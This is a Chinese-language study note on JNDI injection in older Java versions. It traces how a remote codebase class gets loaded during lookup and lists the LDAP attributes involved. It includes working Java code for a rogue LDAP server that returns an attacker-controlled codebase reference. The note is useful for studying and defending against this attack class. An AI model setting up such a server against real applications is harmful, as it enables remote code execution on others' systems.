# UrlClassloader

发起一个JNDI请求，一般的方式就是

```java
InitialContext.doLookup("ldap://<ip>:<port>/<entry>")
```

在< jdk8u121 的时候，在`InitialContext.doLookup()`时，会有一个根据`codebase`去加载远程类的操作

**`javax.naming.spi.NamingManager#getObjectFactoryFromReference`**

```java
static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName){
    String codebase = ref.getFactoryClassLocation(); 
    clas = helper.loadClass(factoryName, codebase);
    return (ObjectFactory) clas.newInstance();
}
```

存放`codebase`的`ref`在**`com.sun.jndi.ldap.LdapCtx#c_lookup`*被组装。`attrs`即ldap服务器返回的`attrs`

```java
if (attrs.get(Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME]) != null) {
    // serialized object or object reference
    obj = Obj.decodeObject(attrs);
}
```

要进入这些if判断，需要设置多个`attrs`，如下

```java
javaCodeBase - urlClassLoader路径
javaFactory - 加载类名
javaClassName - 加载类名
objectClass - 固定值javaNamingReference
```



jndi注入攻击中，需要自建一个服务端，用以返回恶意的`attrs`。在java中，可以使用`unboundid-ldapsdk`起一个基本的ldap服务器

```java
InetAddress host = Inet4Address.getByAddress(new byte[]{
    (byte) 0,
    (byte) 0,
    (byte) 0,
    (byte) 0,
});

InMemoryListenerConfig inMemoryListenerConfig = new InMemoryListenerConfig(
    "server",
    host,
    ldapServerPort,
    ServerSocketFactory.getDefault(),
    SocketFactory.getDefault(),
    (SSLSocketFactory) SSLSocketFactory.getDefault()
);

InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=com"); //指定根dn
config.setListenerConfigs(inMemoryListenerConfig);
config.setSchema(null);
//创建一个LDAP Server。加载上文的config
InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

//设置attrs
Entry entry = new Entry("dc=com");
entry.addAttribute("javaCodeBase", httpServerUrl);
entry.addAttribute("javaFactory", className);
entry.addAttribute("javaClassName", className);
entry.addAttribute("objectClass", "javaNamingReference");
ds.addEntries(entry);

ds.startListening();
```



# Reference

[Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）](https://paper.seebug.org/1091/)

[搞懂RMI、JRMP、JNDI-终结篇](https://threedr3am.github.io/2020/03/03/%E6%90%9E%E6%87%82RMI%E3%80%81JRMP%E3%80%81JNDI-%E7%BB%88%E7%BB%93%E7%AF%87/)